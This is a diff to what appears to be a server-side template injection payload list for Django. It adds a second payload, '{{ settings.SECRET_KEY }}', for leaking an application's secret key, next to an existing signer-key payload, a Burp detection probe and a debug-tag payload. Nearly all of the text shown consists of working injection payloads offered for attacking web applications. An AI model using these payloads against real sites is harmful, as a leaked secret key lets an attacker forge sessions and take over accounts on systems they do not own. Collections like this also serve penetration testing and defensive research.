@@ -72,10 +72,15 @@ ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
 {% debug %}
 ```
 
-### Django - Leaking App's Secret Key
+### Django - Leaking App's Secret Key PAYLOAD #1
 
 ```python
 {{ messages.storages.0.signer.key }}
+```
+###Django - Leaking App's Secret Key PAYLOAD #2
+
+```python
+{{ settings.SECRET_KEY }}
 ```
 
 ### Django - Admin Site URL leak
